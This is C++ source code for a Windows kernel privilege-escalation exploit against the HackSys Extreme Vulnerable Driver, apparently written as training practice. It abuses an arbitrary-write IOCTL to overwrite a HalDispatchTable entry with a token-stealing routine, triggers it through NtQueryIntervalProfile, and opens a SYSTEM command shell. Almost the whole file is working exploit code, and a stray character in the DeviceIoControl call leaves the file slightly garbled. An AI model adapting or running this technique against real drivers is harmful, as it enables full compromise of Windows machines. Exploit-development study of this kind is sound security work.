#include <stdio.h>
#include <windows.h>
#include <ShlObj.h>
#include<Psapi.h>
#include<libloaderapi.h>
#include <strsafe.h>

#include "KernelPwnLib.h"


#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

#define EIP_OFFSET		  0x808	

extern "C" VOID GetToken();

void ErrorExit(LPTSTR lpszFunction)
{
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)& lpMsgBuf,
		0, NULL);

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	ExitProcess(dw);
}

void Send_IOCTL2(INT_PTR krnl_HalDispatchTable,HANDLE device)
{
	
	ULONG_PTR* UserModeBuffer = (ULONG_PTR*)VirtualAlloc(
		NULL,								
		16,								
		MEM_COMMIT | MEM_RESERVE,			
		PAGE_EXECUTE_READWRITE			
	);

	if (UserModeBuffer == NULL)
	{
		printf("\n[-] Failed to allocate usermode buffer");
		exit(-1);
	}
	printf("\n\n[+] userModeBuffer Allocated: 0x%p\n", UserModeBuffer);

	ULONG_PTR What = (ULONG_PTR)&GetToken;
	*UserModeBuffer = (ULONG_PTR)&What;
	*(UserModeBuffer + 1) = krnl_HalDispatchTable + 8;

	printf("[+] userModeBuffer : What  : 0x%p\n", *UserModeBuffer);
	printf("[+] userModeBuffer : Where : 0x%p\n", *(UserModeBuffer+1));
	
	DWORD size_returned = 0;

	DWORD dwIoControlCode = HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE;
	LPVOID lpOutBuffer = NULL;
	DWORD nOutBufferSize = NULL;
	LPDWORD lpBytesReturned = &size_returned;
	LPOVERLAPPED lpOverlapped = NULL;

	printf("\n[?] Sending IOCTL ..... \n\n");
	BOOL sent_ioctl = DeviceIoControl(
	q	device,
		dwIoControlCode,
		UserModeBuffer,
		16,
		lpOutBuffer,
		nOutBufferSize,
		lpBytesReturned,
		lpOverlapped
	);

	

	if (sent_ioctl == 0)
	{
		printf("[-] Error Sending IOCTL\n");
		printf("\n\t[-] GetLastError: 0x%x\n", GetLastError());
		ErrorExit((LPSTR)"DeviceIoControl");
		exit(-1);
	}

	typedef NTSTATUS(NTAPI * PtrNtQueryIntervalProfile)(
		ULONG ProfileSource,
		PULONG Interval
		);

	printf("\t[+] IOCTL Sent\n\n");

	HMODULE ntdll = GetModuleHandle("ntdll");
	PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
	if (_NtQueryIntervalProfile == NULL) {
		printf("\n[-] Failed to get address of NtQueryIntervalProfile");
		exit(-1);
	}
	printf("[+] Address of NtQueryIntervalProfile is : 0x%x", _NtQueryIntervalProfile);
	ULONG whatever;
	_NtQueryIntervalProfile(2, &whatever);

	printf("\t[?]Triggering Vulnerability\n\n");

	if (!IsUserAnAdmin())
	{
		printf("\t\t[-] Priv Escalation Failed to get NT SYSTEM\n\n");
	}
	else
	{
		printf("\t\t[+][+] HooraaaaaY Got SYSTEM prompt\n\n");
		system("cmd");
	}
	
}


int main()
{
	
	SYSTEM_MODULE_INFORMATION_ENTRY kernelBase = *GetKernelBase_By_NtQuerySystemInformation();
	
	INT_PTR addr_ntoskrnl = (INT_PTR)&kernelBase.ImageBase;
	printf("[+] Address of ntoskrnl.exe at 0x%p\n", kernelBase.ImageBase);

	UCHAR *kernelName = kernelBase.FullPathName + kernelBase.OffsetToFileName;
	printf("[+] Kernel Name : %s", kernelName);
	
	HMODULE h_user_ntoskrnl = LoadLibraryEx((LPCSTR)kernelName, 0, 0);
	if (h_user_ntoskrnl == NULL)
	{
		printf("[-] Failed to load user space kernel : %s", kernelName);
		exit(-1);
	}
	printf("\n[+] Loaded User space kernel : 0x%p", h_user_ntoskrnl);

	INT_PTR user_HalDispatchTable = (INT_PTR)GetProcAddress(h_user_ntoskrnl,"HalDispatchTable");

	if (user_HalDispatchTable == NULL)
	{
		printf("\n[-] Failed to get Address of HalDispatchTable");
	}
	printf("\n[+] Found Address of HalDispatchTable in UserMod : 0x%p", user_HalDispatchTable);

	INT_PTR krnl_HalDispatchTable = (INT_PTR)kernelBase.ImageBase - (INT_PTR)h_user_ntoskrnl + (INT_PTR)user_HalDispatchTable;

	printf("\n[+] Found Address of HalDispatchTable in KernelMod : 0x%p", krnl_HalDispatchTable);

	HANDLE device = open_device();

	Send_IOCTL2(krnl_HalDispatchTable, device);

	

	printf("\n\n---------------------===========Reached End of Program===============------------\n");

	return 0;
}